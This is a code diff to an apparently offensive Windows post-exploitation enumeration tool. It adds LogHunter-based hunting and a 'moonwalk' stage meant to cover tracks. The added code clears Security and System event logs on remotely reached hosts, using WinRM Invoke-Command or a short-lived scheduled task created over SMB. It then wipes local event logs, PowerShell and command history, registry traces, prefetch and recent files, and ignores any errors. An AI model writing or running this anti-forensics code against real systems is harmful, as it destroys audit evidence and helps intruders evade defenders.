@@ -11,6 +11,7 @@ from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeEl
 from rich.table import Table
 from rich import box
 from modules.utils import execute_cmd, execute_powershell, validate_target
+from modules.loghunter_integration import LogHunter, WindowsMoonwalk
 
 
 class AutoEnumerator:
@@ -36,6 +37,9 @@ class AutoEnumerator:
         self.max_depth = 3  # Maximum lateral movement depth
         self.visited_hosts = set()  # Track visited hosts to avoid loops
         self.lateral_path = []  # Current lateral movement path
+        self.loghunter = None
+        self.moonwalk = WindowsMoonwalk(console, session_data)
+        self.use_moonwalk = True  # Enable moonwalk at all stages
     
     def run_full_enumeration(self) -> Dict[str, Any]:
         """Run complete enumeration across all modules"""
@@ -99,6 +103,15 @@ class AutoEnumerator:
             # Certificate enumeration (if MADCert available)
             task7 = progress.add_task("[cyan]Certificate Enumeration...", total=100)
             self._enumerate_certificates(progress, task7)
+            
+            # LogHunter enumeration
+            task8 = progress.add_task("[cyan]LogHunter Analysis...", total=100)
+            self._enumerate_with_loghunter(progress, task8)
+            
+            # Moonwalk cleanup
+            if self.use_moonwalk:
+                task9 = progress.add_task("[cyan]Moonwalk Cleanup...", total=100)
+                self._perform_moonwalk_cleanup(progress, task9)
         
         return self.enumeration_data
     
@@ -393,6 +406,27 @@ class AutoEnumerator:
                 # Enumerate remote target
                 remote_data = self._enumerate_remote_target(target, target_info, depth)
                 
+                # Moonwalk cleanup after remote enumeration
+                if self.use_moonwalk:
+                    try:
+                        # Clear logs on remote target if possible
+                        if target_info.get('winrm'):
+                            ps_cmd = f'Invoke-Command -ComputerName {target} -ScriptBlock {{ wevtutil.exe cl Security; wevtutil.exe cl System }}'
+                            execute_powershell(ps_cmd, lab_use=self.lab_use)
+                        elif target_info.get('smb'):
+                            # Use scheduled task to clear logs
+                            task_name = f"CleanTask_{int(time.time())}"
+                            cmd = 'wevtutil.exe cl Security & wevtutil.exe cl System'
+                            create_cmd = f'schtasks /create /s {target} /tn {task_name} /tr "cmd.exe /c {cmd}" /sc once /st 00:00 /f'
+                            execute_cmd(create_cmd, lab_use=self.lab_use)
+                            run_cmd = f'schtasks /run /s {target} /tn {task_name}'
+                            execute_cmd(run_cmd, lab_use=self.lab_use)
+                            time.sleep(1)
+                            delete_cmd = f'schtasks /delete /s {target} /tn {task_name} /f'
+                            execute_cmd(delete_cmd, lab_use=self.lab_use)
+                    except Exception:
+                        pass  # Continue even if cleanup fails
+                
                 # Store lateral path
                 path_entry = {
                     'path': self.lateral_path.copy(),
@@ -678,6 +712,72 @@ class AutoEnumerator:
         
         except Exception:
             self.enumeration_data['certificates']['status'] = 'MADCert not available'
+            progress.update(task, advance=100)
+    
+    def _enumerate_with_loghunter(self, progress, task):
+        """Enumerate using LogHunter"""
+        try:
+            if not self.loghunter:
+                self.loghunter = LogHunter(self.console, self.session_data)
+                self.loghunter.loghunter_path = self.loghunter.find_loghunter()
+            
+            if not self.loghunter.loghunter_path:
+                self.enumeration_data['loghunter'] = {'status': 'LogHunter not available'}
+                progress.update(task, advance=100)
+                return
+            
+            # Hunt credential access
+            progress.update(task, advance=25, description="[cyan]Hunting credential access...")
+            cred_results = self.loghunter.hunt_credential_access()
+            self.enumeration_data['loghunter'] = {
+                'credential_access': cred_results
+            }
+            
+            # Hunt lateral movement
+            progress.update(task, advance=25, description="[cyan]Hunting lateral movement...")
+            lateral_results = self.loghunter.hunt_lateral_movement()
+            self.enumeration_data['loghunter']['lateral_movement'] = lateral_results
+            
+            # Hunt privilege escalation
+            progress.update(task, advance=25, description="[cyan]Hunting privilege escalation...")
+            priv_results = self.loghunter.hunt_privilege_escalation()
+            self.enumeration_data['loghunter']['privilege_escalation'] = priv_results
+            
+            progress.update(task, advance=25, description="[green]LogHunter analysis complete")
+        
+        except Exception as e:
+            self.enumeration_data['loghunter'] = {'error': str(e)}
+            progress.update(task, advance=100)
+    
+    def _perform_moonwalk_cleanup(self, progress, task):
+        """Perform moonwalk cleanup after enumeration"""
+        try:
+            progress.update(task, advance=15, description="[cyan]Clearing event logs...")
+            event_results = self.moonwalk.clear_event_logs(['Security', 'System', 'Application', 'PowerShell'])
+            self.enumeration_data['moonwalk'] = {
+                'event_logs': event_results
+            }
+            
+            progress.update(task, advance=15, description="[cyan]Clearing PowerShell history...")
+            self.moonwalk.clear_powershell_history()
+            
+            progress.update(task, advance=15, description="[cyan]Clearing command history...")
+            self.moonwalk.clear_command_history()
+            
+            progress.update(task, advance=15, description="[cyan]Clearing registry traces...")
+            reg_results = self.moonwalk.clear_registry_traces()
+            self.enumeration_data['moonwalk']['registry'] = reg_results
+            
+            progress.update(task, advance=15, description="[cyan]Clearing prefetch...")
+            self.moonwalk.clear_prefetch()
+            
+            progress.update(task, advance=15, description="[cyan]Clearing recent files...")
+            self.moonwalk.clear_recent_files()
+            
+            progress.update(task, advance=10, description="[green]Moonwalk cleanup complete")
+        
+        except Exception as e:
+            self.enumeration_data['moonwalk'] = {'error': str(e)}
             progress.update(task, advance=100)
 
 
